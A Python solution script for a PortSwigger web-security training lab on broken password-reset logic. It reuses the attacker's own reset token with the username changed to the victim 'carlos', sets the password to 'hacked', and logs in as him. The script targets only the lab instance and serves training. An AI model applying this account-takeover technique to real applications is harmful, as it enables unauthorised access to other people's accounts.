#!/usr/bin/env python


'''This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

Your credentials: wiener:peter
Victim's username: carlos

Lab link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
'''

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs

s = requests.session()

lab_id = '0a0f000c043a90fa81f7de46003a002a' #change based on generated lab
email_id = '0a200006048a90ac81eddda701390081' #change based on generated email server id

# Generate a forgot password link
uri = f"https://{lab_id}.web-security-academy.net/forgot-password" 
data = { 'username': 'wiener'}
r1 = s.post(uri, data=data)

# Now check the email page and retrive the reset password link
uri = f"https://exploit-{email_id}.exploit-server.net/email" 
r2 = s.get(uri)
soup = BeautifulSoup(r2.text, 'html.parser')
links = [link.get('href') for link in soup.find_all('a') if 'forgot-password' in link.get('href')]

# We to use the most recently generated password reset link in case there are multiple links found from the array generator above
uri = links[0]

# From the reset link, get the token value contained within. We will need this for the password reset POST operation
parsed_uri = urlparse(uri)
queries = parse_qs(parsed_uri.query)
token = queries['temp-forgot-password-token'][0]

# Fill in the data we need, just change the username to carlos
data = {'temp-forgot-password-token' : token, 
        'username' : 'carlos', 
        'new-password-1' : 'hacked', 
        'new-password-2' : 'hacked'}
r3 = s.post(uri, data=data)

# Login as carlos and access his my account page
uri = f"https://{lab_id}.web-security-academy.net/login"
data = {'username' : 'carlos', 'password' : 'hacked'}
r4 = s.post(uri, data=data)
if 'solved' in r4.text:
    print('solved')
else:
    print('nope')